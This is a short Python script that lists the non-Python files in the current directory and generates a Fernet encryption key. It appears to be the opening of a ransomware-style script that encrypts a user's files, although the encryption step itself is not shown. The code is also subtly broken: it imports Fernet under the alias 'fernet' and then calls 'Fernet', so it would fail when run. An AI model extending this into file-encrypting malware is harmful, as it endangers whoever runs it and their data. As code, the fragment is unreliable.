import os
from cryptography.fernet import Fernet as fernet

files = []

for file in os.listdir():
    if file.endswith(".py"):
        continue

    if os.path.isdir(file):
        continue

    files.append(file)

key = Fernet.generate_key()
